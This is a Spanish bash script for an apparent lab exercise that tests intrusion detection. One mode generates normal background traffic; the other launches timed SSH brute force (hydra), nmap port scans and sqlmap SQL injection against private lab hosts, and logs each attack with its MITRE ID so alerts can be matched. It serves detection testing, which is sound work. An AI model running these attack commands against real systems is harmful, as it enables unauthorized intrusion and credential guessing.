#!/usr/bin/env bash
# =============================================================================
# escenario3_mixto.sh — ESCENARIO 3: Tráfico mixto
#
# REQUIERE DOS TERMINALES SIMULTÁNEAS:
#
#   TERMINAL A (VM Linux en VLAN10 o VLAN20):
#     bash escenario3_mixto.sh trafico
#     → genera tráfico normal de fondo durante toda la ventana
#
#   TERMINAL B (Kali, 192.168.30.20):
#     bash escenario3_mixto.sh ataques
#     → dispara ataques en instantes aleatorios dentro de la misma ventana
#
# Ambas terminales escriben sus timestamps en /tmp/ para
# que calcular_metricas.py pueda cruzar ataques con alertas.
#
# USO:
#   bash escenario3_mixto.sh trafico   # en VM Linux (no Kali)
#   bash escenario3_mixto.sh ataques   # en Kali
# =============================================================================
set -uo pipefail

MODO="${1:-}"
DURACION_MIN=60
WEB_IP="192.168.10.10"
DC_IP="192.168.10.20"
GW_IP="192.168.10.1"
SSH_TARGET="192.168.10.10"
SCAN_TARGET="192.168.10.0/24"
WEB_URL="http://192.168.10.10/login.html?user=1"
LOG_CSV="/tmp/log_ataques_escenario3.csv"

CYAN='\033[0;36m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
info() { echo -e "${CYAN}[$(date '+%H:%M:%S')]${NC} $*"; }
ok()   { echo -e "${GREEN}[OK]${NC}   $*"; }

if [[ -z "$MODO" ]]; then
    echo "Uso: $0 trafico | ataques"
    echo "  trafico  → ejecutar en una VM Linux (genera tráfico normal)"
    echo "  ataques  → ejecutar en Kali (dispara ataques aleatorios)"
    exit 1
fi

# ─────────────────────────────────────────────────────────────────────────────
if [[ "$MODO" == "trafico" ]]; then

    FIN=$(( $(date +%s) + DURACION_MIN * 60 ))
    INICIO_ISO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    echo "inicio=${INICIO_ISO}" > /tmp/escenario3_ventana.txt

    echo ""
    echo "════════════════════════════════════════════════════════"
    echo "  ESCENARIO 3 — TRÁFICO NORMAL (${DURACION_MIN} min)"
    echo "  Inicio: $(date)"
    echo "  → Deja esto corriendo y abre otra terminal en Kali"
    echo "    para ejecutar: bash escenario3_mixto.sh ataques"
    echo "════════════════════════════════════════════════════════"

    ITER=0
    while [ "$(date +%s)" -lt "$FIN" ]; do
        ITER=$((ITER + 1))
        info "Iteración ${ITER} — $(( (FIN - $(date +%s)) / 60 )) min restantes"

        curl -s -m 5 -o /dev/null "http://${WEB_IP}/" || true
        sleep 2
        curl -s -m 5 -o /dev/null "http://${WEB_IP}/login.html" || true
        ping -c 1 -W 1 "${GW_IP}" &>/dev/null || true
        ping -c 1 -W 2 "${DC_IP}" &>/dev/null || true

        if command -v dig &>/dev/null; then
            dig +short +time=2 "empresa.local" "@${DC_IP}" &>/dev/null || true
        fi

        echo "$(date) trafico-normal" >> /tmp/trafico_escenario3.log
        sleep $(( (RANDOM % 25) + 10 ))
    done

    FIN_ISO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    echo "fin=${FIN_ISO}" >> /tmp/escenario3_ventana.txt
    ok "Tráfico normal finalizado. Ventana: /tmp/escenario3_ventana.txt"

# ─────────────────────────────────────────────────────────────────────────────
elif [[ "$MODO" == "ataques" ]]; then

    FIN=$(( $(date +%s) + DURACION_MIN * 60 ))
    echo "ataque,mitre_id,target_ip,inicio,fin,repeticion" > "$LOG_CSV"

    WORDLIST="/tmp/wordlist_lab.txt"
    [[ -f "$WORDLIST" ]] || printf "123456\npassword\nvagrant\nadmin\nletmein\n" > "$WORDLIST"

    echo ""
    echo "════════════════════════════════════════════════════════"
    echo "  ESCENARIO 3 — ATAQUES ALEATORIOS (${DURACION_MIN} min)"
    echo "  Log: ${LOG_CSV}"
    echo "════════════════════════════════════════════════════════"

    ATAQUES=("ssh" "scan" "sqli")
    NUM_ATAQUES=0

    while [ "$(date +%s)" -lt "$FIN" ]; do
        # Espera aleatoria entre 4 y 10 minutos
        ESPERA=$(( (RANDOM % 360) + 240 ))
        info "Próximo ataque en $((ESPERA / 60)) min $((ESPERA % 60)) seg..."
        sleep "$ESPERA"
        [ "$(date +%s)" -ge "$FIN" ] && break

        # Elegir ataque aleatorio
        IDX=$(( RANDOM % ${#ATAQUES[@]} ))
        TIPO="${ATAQUES[$IDX]}"
        INICIO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

        case "$TIPO" in
            ssh)
                info "→ Disparando: fuerza bruta SSH contra ${SSH_TARGET}"
                hydra -l vagrant -P "${WORDLIST}" -t 4 \
                    "ssh://${SSH_TARGET}" -o "/tmp/hydra_e3_$(date +%s).log" 2>/dev/null || true
                echo "bruteforce_ssh,T1110.001,${SSH_TARGET},${INICIO},$(date -u +"%Y-%m-%dT%H:%M:%SZ"),1" >> "$LOG_CSV"
                ;;
            scan)
                info "→ Disparando: escaneo de puertos contra ${SCAN_TARGET}"
                nmap -sS -T4 --top-ports 100 "${SCAN_TARGET}" \
                    -oN "/tmp/nmap_e3_$(date +%s).log" 2>/dev/null || true
                echo "portscan,T1046,${SCAN_TARGET},${INICIO},$(date -u +"%Y-%m-%dT%H:%M:%SZ"),1" >> "$LOG_CSV"
                ;;
            sqli)
                info "→ Disparando: inyección SQL contra ${WEB_URL}"
                sqlmap -u "${WEB_URL}" --batch --level=1 --risk=1 \
                    --output-dir="/tmp/sqlmap_e3_$(date +%s)" 2>/dev/null || true
                echo "sql_injection,T1190,${SSH_TARGET},${INICIO},$(date -u +"%Y-%m-%dT%H:%M:%SZ"),1" >> "$LOG_CSV"
                ;;
        esac

        NUM_ATAQUES=$((NUM_ATAQUES + 1))
        ok "Ataque #${NUM_ATAQUES} (${TIPO}) completado."
    done

    echo ""
    ok "ESCENARIO 3 ataques completados."
    echo "  Total ataques disparados: ${NUM_ATAQUES}"
    echo "  Log guardado en: ${LOG_CSV}"
    echo ""
    echo "  Combina este CSV con el del escenario 2 para el análisis:"
    echo "    cat /tmp/log_ataques.csv ${LOG_CSV} | sort -t, -k4 > /tmp/log_todos.csv"
fi
